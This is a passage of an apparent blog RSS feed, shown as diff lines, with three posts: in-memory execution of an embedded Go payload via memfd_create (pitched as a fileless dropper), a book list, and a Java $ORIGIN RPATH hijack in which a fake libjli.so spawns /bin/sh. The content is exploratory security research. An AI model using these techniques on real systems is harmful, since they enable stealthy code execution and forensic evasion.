+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Our</span> <span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">bin</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">executable</span>, <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">example</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;executing payload&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go build -o g.go file.bin
+</span></span></code></pre></div><p>If we take a look at our built executable with radare2 we see that inside our binary there’s another one embedded:</p>
+<p><img src="/go_embedding.png" alt="memory hexdump" title="memory hexdump"></p>
+<p>As we can see from the image above we resolve the symbol of our payload variable main.filePayload, which is in this case a []byte slice. The first quadword is the address where this variable resides, the second quadword is the len of the slice, and the third quadword is the capacity which matches of course in this case with the length.</p>
+<p>Then we execute executor which embeds our file and that’s done.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./executor
+</span></span><span style="display:flex;"><span>executing payload
+</span></span></code></pre></div><p>If we strace the process we’ll see something similar</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strace -ememfd_create,execveat ./executor
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 79498<span style="color:#f92672">]</span> memfd_create<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/file.bin&#34;</span>, 0<span style="color:#f92672">)</span>  <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 79498<span style="color:#f92672">]</span> execveat<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;&#34;</span>, NULL, NULL, AT_EMPTY_PATH
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>executing payload
+</span></span></code></pre></div><p>Now this example was very simple, and of course not so useful. But for what that stuff could be used for in a real world scenario? Well one could use a technique like this as a file dropper, imagine if the content of the file.bin was something encrypted, which could just being decrypted with a key downloadable over the internet. Then executing and throwing away the key, of course will remain no persistence on the file system, so basically just live memory forensic could actually catch the clear payload, and just if it is still executing while the analysis gets performed.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Books I’ve enjoyed between a lockdown and a red zone</title>
+            <link>https://example.org/posts/07-books-2021/</link>
+            <pubDate>Sun, 03 Jan 2021 17:31:22 +0200</pubDate>
+            
+            <guid>https://example.org/posts/07-books-2021/</guid>
+            <description>2020 for sure has been an unconventional year. Humanity has been hit by a catastrophe and people habits have changed a lot. Spending most time at home for some has been uncomfortable, for others like me, working in IT, not that much has been changed to be honest. Despite difficulties to see friends and hang for a beer or being distant from family, it’s not that I spend too much time distant from my laptop or guitars.</description>
+            <content type="html"><![CDATA[<p>2020 for sure has been an unconventional year. Humanity has been hit by a catastrophe and people habits have changed a lot. Spending most time at home for some has been uncomfortable, for others like me, working in IT, not that much has been changed to be honest. Despite difficulties to see friends and hang for a beer or being distant from family, it’s not that I spend too much time distant from my laptop or guitars.</p>
+<p>After work usually I spend my spare time studing guitar, reading tech books or experimenting with side projects.</p>
+<p>Here are some of the books I’ve enjoyed this year.</p>
+<ul>
+<li>SWDMA – It explains lot of modes you can hear on HF frequencies</li>
+<li>Bootkits and Rootkits – It talks about low level threats in BIOS and UEFI</li>
+<li>SDR for Engineers – If you’re curious about what’s going on your software defined radio dongle</li>
+<li>Digital Modulations Using MATLAB – Contains the basic of modulation and simulation using MATLAB, stuff like FSK, PSK etc…</li>
+<li>DSP for Engineers – If you want to understand about FFT, filters and other funny stuff between time and frequency domains</li>
+<li>The Rust Programming Language – If you want to dig deep in Rust</li>
+<li>BPF Performance Tools – A great book about Linux Kernel BPF subsystem</li>
+<li>Legato Guitar Technique Mastery – This book like the others written by Chris Brooks is really awesome if you want to seriously improve on guitar</li>
+<li>Global Radio Guide (Summer Edition) – Don’t miss the new Winter Edition too if you like news from the radio world</li>
+<li>100 Arpeggio Licks for Shred Guitar – Another great book by Chris Brooks</li>
+<li>Melodic Minor Cookbook – Really helpful mastering this scale on guitar, it will open you to new musical horizons</li>
+<li>Creative Tapping for Modern Guitar – Tapping is cool!</li>
+<li>Necronomicon – Do you like Lovecraft?</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Having fun and really no profit with $ORIGIN expansion variable in Java</title>
+            <link>https://example.org/posts/05-elf-origin-expansion/</link>
+            <pubDate>Mon, 30 Jan 2017 17:22:16 +0200</pubDate>
+            
+            <guid>https://example.org/posts/05-elf-origin-expansion/</guid>
+            <description>Having fun and really no profit with $ORIGIN expansion variable in Java gennaio 30th, 2017
+Days ago I was reading this [0] interesting article about the dynamic linker expansion variables, and so I tought it would be fun to search for binaries with the RPATH dynamic tag containing the $ORIGIN variable.
+So digging through dynamic tags using eu-readelf -d I found that the java ELF binary has the following RPATH:</description>
+            <content type="html"><![CDATA[<p>Having fun and really no profit with $ORIGIN expansion variable in Java
+gennaio 30th, 2017</p>
+<p>Days ago I was reading this [0] interesting article about the dynamic linker
+expansion variables, and so I tought it would be fun to search for binaries
+with the RPATH dynamic tag containing the $ORIGIN variable.</p>
+<p>So digging through dynamic tags using <code>eu-readelf -d</code> I found that the java
+ELF binary has the following RPATH:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Library rpath: [$ORIGIN/../lib/amd64/jli:$ORIGIN/../lib/amd64]
+</span></span></code></pre></div><p>Using <code>ldd</code> comes up that java searches this paths looking for the shared
+object (for which I dunno really the purpose yet):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>libjli.so =&gt; /home/$USER/jdk1.8.0_65/jre/bin/../lib/amd64/jli/libjli.so
+</span></span></code></pre></div><p>So my attempt to mess with the $ORIGIN var was to create on the same level
+of the jdk directory a directory called <code>./bin</code> containing an hard-link or even
+a copy of the java binary, and a directory tree on the same level of <code>bin</code>,
+which had the following path:
+<code>./lib/amd64/jli</code>.</p>
+<p>Trying to run the java binary from the new <code>./bin/</code> path happened exactly what I wanted to
+see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./bin/java: error <span style="color:#66d9ef">while</span> loading shared libraries: libjli.so: cannot open shared
+</span></span><span style="display:flex;"><span>object file: No such file or directory<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><p>So ok, let&rsquo;s build a shared object called that name into <code>lib/amd64/jli</code>
+and see what happens&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cat libjli.c </span>
+</span></span><span style="display:flex;"><span>int foobar<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> 0x29a;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o libjli.so -shared -fPIC libjli.c
+</span></span></code></pre></div><p>And now we try to run again the java binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./bin/java: /tmp/spike/java/bin/../lib/amd64/jli/libjli.so: no version
+</span></span><span style="display:flex;"><span>information available <span style="color:#f92672">(</span>required by ./bin/java<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>./bin/java: relocation error: ./bin/java: symbol JLI_Launch, version
+</span></span><span style="display:flex;"><span>SUNWprivate_1.1 not defined in file libjli.so with link time reference
+</span></span></code></pre></div><p>Good, looking at the main function of the java binary we find a call
+to the <code>JLI_Launch</code> function:
+<code>0x0000000000400691 &lt;+113&gt;:	call   0x400520 &lt;JLI_Launch@plt&gt;</code></p>
+<p>So we redefine our fake <code>libjli.so</code> adding the <code>JLI_Launch</code> function
+and also we export the required versioning info.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cat libjli.c </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>void JLI_Launch<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>And now a simple version script for the linker:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#cat libjli.map</span>
+</span></span><span style="display:flex;"><span>SUNWprivate_1.1 <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	global:
+</span></span><span style="display:flex;"><span>		JLI_Launch;		
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>;
+</span></span></code></pre></div><p>Finally we recompile the shared object applying the linker script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -c libjli.c -fPIC
+</span></span><span style="display:flex;"><span>gcc -o libjli.so -shared -Wl,--version-script<span style="color:#f92672">=</span>libjli.map
+</span></span></code></pre></div><p>Now trying to execute the java binary from the ./bin/ path:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>spike@zombie java<span style="color:#f92672">]</span>$ ./bin/java
+</span></span><span style="display:flex;"><span>sh-4.3$
+</span></span></code></pre></div><p>That&rsquo;s all folks!</p>
+<p>[0] <a href="https://backtrace.io/blog/blog/2016/06/29/exploiting-elf-expansion-variables/">https://backtrace.io/blog/blog/2016/06/29/exploiting-elf-expansion-variables/</a></p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
